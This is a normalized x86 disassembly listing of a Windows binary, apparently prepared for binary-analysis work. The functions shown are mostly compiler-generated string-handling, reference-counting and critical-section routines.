sub_401020
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
mov esi ecx
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
inc [ edi + 0x4 ]
mov [ esi ] edi
pop edi
pop esi
retn 0x4
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_401070
mov ecx [ esp + 0xc ]
mov al [ ecx + 0x90 ]
test al al
je r-xdata
mov eax [ esp + 0x4 ]
imul eax eax 0x64
cdq
idiv [ esp + 0x8 ]
mov [ ecx + 0x98 ] eax
xor eax eax
retn 0xc
mov eax 0x1
retn 0xc
sub_4010c0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_4010f0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_401120
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_401150
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
cmp [ esi + 0x14 ] ebp
jae r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esp + 0x14 ]
sub eax ebp
cmp eax edx
jae r-xdata
call sub_4b5762
test edx edx
mov ebx [ esp + 0x1c ]
je r-xdata
mov edx eax
cmp edx ebx
jae r-xdata
cmp edx ebx
mov ecx edx
jb r-xdata
xor eax eax
cmp edx ebx
setne al
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x10
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
push edi
mov edi [ esp + 0x1c ]
lea esi [ eax + ebp ]
xor eax eax
[ esi ] [ edi ]
pop edi
je r-xdata
pop esi
pop ebp
pop ebx
retn 0x10
sub_401200
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x14 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push edx
add eax 0x4
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
retn 0x4
mov eax [ eax + 0x4 ]
push edx
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
retn 0x4
sub_401240
push ebp
mov ebp esp
push 0xffffffff
push sub_4be730
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
push edi
mov ebx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ esi + 0x1 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4b573e
mov edx eax
add esp 0x4
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov [ ebp - 0x14 ] eax
mov esi eax
mov ecx [ ebp + 0xc ]
test ecx ecx
jbe r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
cmp esi 0x10
lea eax [ ebx + 0x4 ]
mov [ eax ] 0x0
mov [ eax ] edx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x14 ] ecx
jb r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
lea esi [ ebx + 0x4 ]
mov esi [ ebx + 0x4 ]
jmp r-xdata
pop edi
mov [ eax + ecx ] 0x0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax edx
mov eax ecx
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
sub_40132d
mov esi [ ebp - 0x18 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push 0x0
mov [ esi + 0x4 ] 0x0
call sub_4b5bd2
int3
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401380
mov edx [ esp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x8 ]
sub eax esi
push eax
mov eax [ ecx + 0x14 ]
push edx
push eax
push 0x0
call sub_401150
neg eax
sbb eax eax
inc eax
pop esi
retn
sub_4013c0
mov eax [ esp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ esp + 0x8 ]
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
neg eax
sbb eax eax
inc eax
retn
sub_4013f0
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
cmp edx eax
mov ecx [ esp + 0x10 ]
push esi
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop esi
retn
mov esi [ eax - 0x8 ]
sub eax 0x8
sub ecx 0x8
cmp eax edx
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
jne r-xdata
sub_401420
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
dec eax
push edi
mov [ esi + 0x28 ] eax
call [ GetCurrentThreadId@IAT ]
mov edi [ esi + 0x1c ]
xor edx edx
mov ecx [ esi + 0x20 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
xor eax eax
retn
mov ecx [ esi + 0x1c ]
cmp [ ecx + edx * 8 ] eax
je r-xdata
cmp edx ecx
jge r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax + edx * 8 + 0x4 ]
lea eax [ eax + edx * 8 + 0x4 ]
dec ecx
mov [ eax ] ecx
mov ecx [ esi + 0x1c ]
mov edi [ ecx + edx * 8 + 0x4 ]
push esi
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn
inc edx
jmp r-xdata
test edi edi
jne r-xdata
sub_401490
push esi
push edi
mov esi ecx
call [ GetCurrentThreadId@IAT ]
mov edi [ esi + 0x1c ]
xor edx edx
nop
mov ecx [ esi + 0x20 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
pop edi
pop esi
xor eax eax
retn
mov ecx [ esi + 0x1c ]
cmp [ ecx + edx * 8 ] eax
je r-xdata
cmp edx ecx
jge r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + edx * 8 + 0x4 ]
pop edi
pop esi
retn
inc edx
jmp r-xdata
test edi edi
jne r-xdata
sub_4014e0
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
push edi
mov [ esi ] ecx
call sub_401490
xor edi edi
test eax eax
mov [ esi + 0x4 ] eax
jle r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
mov ecx [ esi ]
call sub_401420
mov eax [ esi + 0x4 ]
inc edi
cmp edi eax
jl r-xdata
sub_401530
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4be748
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
mov [ esp + 0x14 ] 0x0
mov edi 0x6
mov ebx 0x10
ja r-xdata
cmp [ esp + 0x34 ] ebx
jb r-xdata
jmp [ eax * 4 + jump_table_401698 ]
mov ecx [ esp + 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x34 ] ebx
mov eax [ esp + 0x20 ]
jae r-xdata
mov ecx [ esp + 0x30 ]
cmp ecx 0x4
jbe r-xdata
push eax
call sub_4b3c20
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x20 ]
cmp eax 0x1
jne r-xdata
cmp [ esp + 0x34 ] ebx
mov eax [ esp + 0x20 ]
jae r-xdata
mov edi 0x4
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
cmp [ esp + 0x34 ] ebx
mov eax [ esp + 0x20 ]
jae r-xdata
lea esi [ eax + ecx - 0x4 ]
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
push eax
call sub_4b3c20
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
mov edi 0x3
jmp r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov edi 0x1
jmp r-xdata
sub_4016b0
push 0xffffffff
push sub_4be788
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov ecx [ esi + 0x28 ]
test ecx ecx
mov [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_401720
push esi
push edi
mov edi [ esp + 0xc ]
cmp edi 0xfffffffe
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_4b57a2
mov cl [ esp + 0x10 ]
test cl cl
je r-xdata
mov al [ esp + 0x10 ]
test al al
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_401240
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
xor eax eax
push eax
push edi
mov ecx esi
call sub_401240
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
cmp eax 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
cmp eax 0x10
jb r-xdata
add esi 0x4
mov [ esi ] 0x0
mov esi [ esi + 0x4 ]
xor eax eax
cmp eax edi
sbb eax eax
pop edi
mov [ esi ] 0x0
neg eax
pop esi
retn 0x8
xor eax eax
cmp eax edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
sbb eax eax
pop edi
mov [ esi + 0x4 ] 0x0
neg eax
pop esi
retn 0x8
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4017f0
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x14 ]
or eax 0xffffffff
push edi
mov edi [ esp + 0x10 ]
sub eax edx
cmp eax edi
ja r-xdata
test edi edi
jbe r-xdata
call sub_4b57a2
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ebp [ esi + 0x14 ]
add ebp edi
cmp ebp 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax ebp
jae r-xdata
mov ecx esi
call sub_4b57a2
test ebp ebp
jne r-xdata
mov ecx [ esi + 0x14 ]
push ecx
push ebp
mov ecx esi
call sub_401240
test ebp ebp
jbe r-xdata
cmp eax 0x10
mov [ esi + 0x14 ] ebp
jb r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov [ eax + ebp ] 0x0
mov eax [ esi + 0x4 ]
mov [ eax + ebp ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx eax [ esp + 0x14 ]
push ebx
mov bl al
mov bh bl
mov ecx edi
mov edi [ esi + 0x14 ]
add edi edx
mov edx ecx
shr ecx 0x2
mov eax ebx
shl eax 0x10
mov ax bx
pop ebx
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] ebp
jb r-xdata
sub_4018c0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
cmp [ edi + 0x14 ] esi
mov ebx ecx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax esi
mov esi [ esp + 0x1c ]
cmp eax esi
jae r-xdata
call sub_4b5762
mov edx [ ebx + 0x14 ]
or eax 0xffffffff
sub eax edx
cmp eax esi
ja r-xdata
mov esi eax
test esi esi
jbe r-xdata
mov ecx ebx
call sub_4b57a2
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn 0xc
mov ebp [ ebx + 0x14 ]
add ebp esi
cmp ebp 0xfffffffe
jbe r-xdata
mov eax [ ebx + 0x18 ]
cmp eax ebp
jae r-xdata
mov ecx ebx
call sub_4b57a2
test ebp ebp
jne r-xdata
mov ecx [ ebx + 0x14 ]
push ecx
push ebp
mov ecx ebx
call sub_401240
test ebp ebp
jbe r-xdata
cmp eax 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
mov ecx [ edi + 0x18 ]
mov eax 0x10
cmp ecx eax
jb r-xdata
pop edi
lea eax [ ebx + 0x4 ]
pop esi
mov [ eax ] 0x0
pop ebp
mov eax ebx
pop ebx
retn 0xc
mov eax [ ebx + 0x4 ]
pop edi
pop esi
mov [ eax ] 0x0
pop ebp
mov eax ebx
pop ebx
retn 0xc
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
cmp [ ebx + 0x18 ] eax
lea edx [ ebx + 0x4 ]
jb r-xdata
mov [ edx + ebp ] 0x0
mov edx [ edx ]
mov ecx esi
mov esi [ esp + 0x18 ]
add esi edi
mov edi [ ebx + 0x14 ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + 0x18 ] 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
sub_4019b0
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] al
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_401a00
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x88 ]
mov ebp 0x10
cmp eax ebp
push edi
jb r-xdata
xor ebx ebx
mov edi 0xf
mov [ esi + 0x88 ] edi
mov [ esi + 0x84 ] ebx
mov [ esi + 0x74 ] bl
cmp [ esi + 0x6c ] ebp
jb r-xdata
mov eax [ esi + 0x74 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x6c ] edi
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] bl
cmp [ esi + 0x44 ] ebp
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x44 ] edi
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] bl
cmp [ esi + 0x1c ] ebp
jb r-xdata
mov eax [ esi + 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] ebx
pop edi
mov [ esi + 0x8 ] bl
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401a90
push ebx
push esi
mov esi ecx
cmp [ esi + 0x6c ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x6c ] 0xf
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401ae0
push ebx
push esi
mov esi ecx
cmp [ esi + 0x34 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401b30
push ebx
push esi
mov esi ecx
cmp [ esi + 0x88 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x88 ] 0xf
mov [ esi + 0x84 ] ebx
mov [ esi + 0x74 ] bl
cmp [ esi + 0x6c ] 0x10
jb r-xdata
mov eax [ esi + 0x74 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x6c ] 0xf
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401ba0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jae r-xdata
mov eax [ edi + 0x14 ]
mov ebx [ esp + 0x18 ]
sub eax esi
cmp eax ebx
jae r-xdata
call sub_4b5762
test ebx ebx
jbe r-xdata
mov ebx eax
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx [ edi + 0x18 ]
cmp ecx 0x10
lea ebp [ edi + 0x4 ]
jb r-xdata
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
mov ecx ebp
mov ecx [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ edi + 0x18 ]
cmp eax esi
jae r-xdata
mov ecx edi
call sub_4b57a2
sub eax ebx
add edx esi
push eax
add edx ebx
push edx
add ecx esi
push ecx
call sub_4b5890
mov esi [ edi + 0x14 ]
sub esi ebx
add esp 0xc
cmp esi 0xfffffffe
jbe r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x14 ]
push eax
push esi
mov ecx edi
call sub_401240
test esi esi
jbe r-xdata
cmp eax 0x10
mov [ edi + 0x14 ] esi
jb r-xdata
cmp [ edi + 0x18 ] 0x10
mov [ edi + 0x14 ] esi
jb r-xdata
mov eax edi
pop edi
pop esi
mov [ ebp ] 0x0
pop ebp
pop ebx
retn 0x8
mov ebp [ ebp ]
mov [ esi + ebp ] 0x0
mov ebp [ ebp ]
sub_401c60
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x18 ] 0x10
lea ebx [ edi + 0x4 ]
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov esi ecx
sub esi eax
xor esi esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
push eax
push esi
mov ecx edi
call sub_401ba0
cmp [ edi + 0x18 ] 0x10
jb r-xdata
sub eax ecx
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax ebx
lea ecx [ eax + esi ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
mov eax [ ebx ]
lea ecx [ eax + esi ]
mov eax [ esp + 0x10 ]
mov [ eax ] ecx
pop edi
pop esi
pop ebx
retn 0xc
sub_401cc0
push ebx
mov ebx ecx
mov edx [ ebx + 0x18 ]
cmp edx 0x10
push esi
push edi
jb r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov edi [ esp + 0x14 ]
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
cmp edx 0x10
lea eax [ ebx + 0x4 ]
jb r-xdata
mov esi [ esp + 0x10 ]
cmp eax esi
ja r-xdata
test edi edi
jbe r-xdata
mov ecx ebx
call sub_4b57a2
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x8
push ebp
mov ebp [ ebx + 0x14 ]
add ebp edi
cmp ebp 0xfffffffe
jbe r-xdata
cmp edx 0x10
jb r-xdata
mov edi [ ebx + 0x14 ]
add edi ecx
cmp esi edi
jae r-xdata
mov eax [ ebx + 0x18 ]
cmp eax ebp
jae r-xdata
mov ecx ebx
call sub_4b57a2
mov ecx [ esp + 0x14 ]
push ecx
sub esi eax
push esi
push ebx
mov ecx ebx
call sub_4018c0
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ eax ]
test ebp ebp
jne r-xdata
mov eax [ ebx + 0x14 ]
push eax
push ebp
mov ecx ebx
call sub_401240
test ebp ebp
jbe r-xdata
cmp eax 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
pop ebp
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
pop ebp
lea eax [ ebx + 0x4 ]
pop edi
mov [ eax ] 0x0
pop esi
mov eax ebx
pop ebx
retn 0x8
mov eax [ ebx + 0x4 ]
pop ebp
pop edi
mov [ eax ] 0x0
pop esi
mov eax ebx
pop ebx
retn 0x8
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov [ eax + ebp ] 0x0
mov eax [ ebx + 0x4 ]
mov [ eax + ebp ] 0x0
pop ebp
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x8
mov ecx edi
mov edi [ ebx + 0x14 ]
mov edx ecx
shr ecx 0x2
add edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + 0x18 ] 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
sub_401dd0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x14 ]
push edi
mov edi [ esp + 0x18 ]
cmp eax edi
mov ebx ecx
jae r-xdata
mov ebp [ esi + 0x14 ]
mov eax [ esp + 0x1c ]
sub ebp edi
cmp eax ebp
jae r-xdata
call sub_4b5762
cmp ebx esi
mov ecx ebx
jne r-xdata
mov ebp eax
push 0x1
push ebp
call sub_401720
test al al
je r-xdata
push 0xffffffff
add ebp edi
push ebp
call sub_401ba0
push edi
push 0x0
mov ecx ebx
call sub_401ba0
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn 0xc
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn 0xc
mov ecx [ esi + 0x18 ]
mov eax 0x10
cmp ecx eax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp [ ebx + 0x18 ] eax
lea eax [ ebx + 0x4 ]
jb r-xdata
mov [ eax + ebp ] 0x0
mov eax [ eax ]
add esi edi
mov ecx ebp
mov edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + 0x18 ] 0x10
mov [ ebx + 0x14 ] ebp
jb r-xdata
sub_401e80
push ebx
mov ebx ecx
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
push ebp
push esi
lea ebp [ ebx + 0x4 ]
jb r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0x1
push ecx
mov ecx ebx
call sub_401720
test al al
je r-xdata
cmp ecx 0x10
jb r-xdata
mov esi [ esp + 0x10 ]
cmp eax esi
ja r-xdata
pop esi
pop ebp
mov eax ebx
pop ebx
retn 0x8
cmp [ ebx + 0x18 ] 0x10
push edi
jb r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
mov edi ebp
mov edi [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov edx [ ebx + 0x14 ]
add edx eax
cmp esi edx
jae r-xdata
mov [ eax + ebp ] 0x0
mov ebp [ ebp ]
mov ecx [ esp + 0x18 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + 0x18 ] 0x10
mov eax edx
mov [ ebx + 0x14 ] eax
pop edi
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
sub esi ebp
push esi
push ebx
mov ecx ebx
call sub_401dd0
pop esi
pop ebp
pop ebx
retn 0x8
mov ebp [ ebp ]
sub_401f20
push ecx
mov eax [ ecx + 0x18 ]
push ebx
push esi
push ecx
cmp eax 0x10
mov esi esp
lea eax [ ecx + 0x4 ]
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov [ edx ] eax
lea eax [ esp + 0x10 ]
push eax
call sub_401c60
pop esi
pop ebx
pop ecx
retn
mov eax [ eax ]
mov ebx [ ecx + 0x14 ]
add ebx edx
mov [ esi ] ebx
cmp [ ecx + 0x18 ] 0x10
push ecx
mov edx esp
jb r-xdata
sub_401f60
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push 0x0
sub eax edx
push eax
call sub_4017f0
retn 0x4
push 0xffffffff
push eax
call sub_401ba0
retn 0x4
sub_401f90
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_401fc0
push esi
xor eax eax
mov esi ecx
push 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
push eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x10 ]
push eax
call sub_401dd0
mov eax esi
pop esi
retn 0x4
sub_402010
push esi
mov esi [ esp + 0x8 ]
mov eax esi
push edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push esi
call sub_401cc0
pop edi
pop esi
retn 0x4
sub_402040
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
push edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
mov edi edi
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov ecx [ eax + edi * 4 - 0x4 ]
dec edi
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp edi ebx
ja r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
mov ecx [ esi + 0xc ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x8 ]
cmp ecx eax
ja r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + eax * 4 ]
call sub_4016b0
dec [ esi + 0x10 ]
jne r-xdata
sub eax ecx
mov [ esi + 0xc ] ebx
sub_4020c0
push 0xffffffff
push sub_4be788
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov [ esp + 0x18 ] esi
mov [ esi + 0x4 ] bl
call sub_401dd0
push 0xffffffff
lea ecx [ esi + 0x1c ]
push ebx
add edi 0x1c
mov [ ecx + 0x18 ] 0xf
